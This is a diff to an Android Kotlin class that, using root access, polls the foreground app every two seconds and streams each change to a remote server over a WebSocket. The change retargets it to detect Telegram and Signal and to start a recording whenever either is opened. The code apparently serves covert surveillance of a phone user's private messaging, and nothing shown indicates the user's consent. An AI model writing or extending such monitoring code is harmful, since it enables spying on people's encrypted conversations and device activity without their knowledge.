@@ -13,7 +13,8 @@ class ForegroundAppMonitor(
     private val rootExecutor: RootExecutor,
     private val webSocketClient: WebSocketClient,
     private val onRecordingTrigger: (String) -> Unit,
-    private val onRecordingStop: () -> Unit
+    private val onRecordingStop: () -> Unit,
+    private val onAppChanged: (String?) -> Unit = {}
 ) {
     private val TAG = "ForegroundAppMonitor"
 
@@ -22,11 +23,14 @@ class ForegroundAppMonitor(
 
     private var monitoringJob: Job? = null
     private var isRunning = false
-    private val checkIntervalMs = 3000L // Check every 3 seconds
+    private val checkIntervalMs = 2000L // Check every 2 seconds
 
     private var lastPackage: String? = null
-    private val recordingApps = mutableSetOf<String>()
+    private val recordableApps = mutableSetOf<String>()
     private var isRecording = false
+
+    // App detector for Telegram/Signal
+    private val appDetector = AppDetector(context)
 
     suspend fun start() {
         if (isRunning) {
@@ -36,10 +40,17 @@ class ForegroundAppMonitor(
 
         isRunning = true
 
-        // Load recording apps from preferences
-        val appListCollector = AppListCollector(context)
-        recordingApps.addAll(appListCollector.getRecordingApps())
-        Log.d(TAG, "Loaded ${recordingApps.size} recording apps: $recordingApps")
+        // Detect installed Telegram/Signal apps
+        val detectedResult = appDetector.detectApps()
+        if (detectedResult.isSuccess) {
+            val detectedApps = detectedResult.getOrNull() ?: emptyMap()
+            recordableApps.addAll(appDetector.getRecordablePackages())
+
+            Log.d(TAG, "Loaded ${recordableApps.size} recordable apps: $recordableApps")
+            Log.d(TAG, "Detected apps: ${detectedApps.values.map { it.appName }}")
+        } else {
+            Log.e(TAG, "Failed to detect apps")
+        }
 
         Log.d(TAG, "Starting foreground app monitor (interval: ${checkIntervalMs}ms)")
 
@@ -66,6 +77,7 @@ class ForegroundAppMonitor(
 
         // Stop recording if active
         if (isRecording) {
+            Log.d(TAG, "Stopping recording (monitor stopped)")
             onRecordingStop()
             isRecording = false
         }
@@ -76,13 +88,16 @@ class ForegroundAppMonitor(
     private suspend fun checkForegroundApp() {
         val appInfo = rootExecutor.getForegroundAppInfo()
 
-        // Only send update if app has changed
+        // Only process if app has changed
         if (appInfo.packageName != null && appInfo.packageName != lastPackage) {
             lastPackage = appInfo.packageName
             _currentApp.value = appInfo
 
             Log.d(TAG, "Foreground app changed: ${appInfo.packageName} (${appInfo.activityName})")
             sendForegroundAppUpdate(appInfo)
+
+            // Notify UI about app change
+            onAppChanged(appInfo.packageName)
 
             // Check if we should start/stop recording
             handleRecordingForApp(appInfo.packageName)
@@ -92,45 +107,50 @@ class ForegroundAppMonitor(
     private fun handleRecordingForApp(packageName: String?) {
         if (packageName == null) return
 
-        val shouldRecord = packageName in recordingApps
+        val shouldRecord = isRecordableApp(packageName)
+
+        Log.d(TAG, "App: $packageName, Should record: $shouldRecord, Currently recording: $isRecording")
 
         if (shouldRecord && !isRecording) {
             // Start recording when app opens
-            Log.d(TAG, "Starting recording for app: $packageName")
+            val appName = appDetector.getAppName(packageName) ?: packageName
+            Log.d(TAG, "Starting recording for app: $appName ($packageName)")
             isRecording = true
             onRecordingTrigger(packageName)
         } else if (!shouldRecord && isRecording) {
             // Stop recording when app closes
-            Log.d(TAG, "Stopping recording (app changed)")
+            Log.d(TAG, "Stopping recording (app changed to non-recordable app)")
             isRecording = false
             onRecordingStop()
         }
     }
 
-    fun updateRecordingApps(appPackages: List<String>) {
-        recordingApps.clear()
-        recordingApps.addAll(appPackages)
-        Log.d(TAG, "Updated recording apps: $recordingApps")
+    fun isRecordableApp(packageName: String): Boolean {
+        return packageName in recordableApps
+    }
 
-        // Update preferences
-        val appListCollector = AppListCollector(context)
-        appPackages.forEach { appListCollector.addRecordingApp(it) }
+    fun getRecordableApps(): Set<String> {
+        return recordableApps.toSet()
+    }
 
-        // If currently recording and current app is not in new list, stop recording
-        val currentPackage = _currentApp.value?.packageName
-        if (isRecording && currentPackage != null && currentPackage !in recordingApps) {
-            Log.d(TAG, "Current app removed from recording list, stopping recording")
-            isRecording = false
-            onRecordingStop()
+    fun addRecordableApp(packageName: String) {
+        if (packageName !in recordableApps) {
+            recordableApps.add(packageName)
+            Log.d(TAG, "Added recordable app: $packageName")
         }
     }
 
-    fun getRecordingApps(): List<String> {
-        return recordingApps.toList()
+    fun removeRecordableApp(packageName: String) {
+        if (packageName in recordableApps) {
+            recordableApps.remove(packageName)
+            Log.d(TAG, "Removed recordable app: $packageName")
+        }
     }
 
     private fun sendForegroundAppUpdate(appInfo: ForegroundAppInfo) {
         try {
+            val isRecordable = appInfo.packageName?.let { isRecordableApp(it) } ?: false
+
             val message = JSONObject().apply {
                 put("type", "foreground_app")
                 put("device_id", webSocketClient.deviceId)
@@ -139,6 +159,7 @@ class ForegroundAppMonitor(
                     put("activity_name", appInfo.activityName)
                     put("timestamp", appInfo.timestamp)
                     put("is_recording", isRecording)
+                    put("is_recordable", isRecordable)
                 })
             }
             webSocketClient.send(message.toString())
@@ -157,5 +178,9 @@ class ForegroundAppMonitor(
 
     fun isCurrentlyRecording(): Boolean {
         return isRecording
+    }
+
+    fun getCurrentAppName(): String? {
+        return _currentApp.value?.packageName?.let { appDetector.getAppName(it) }
     }
 }
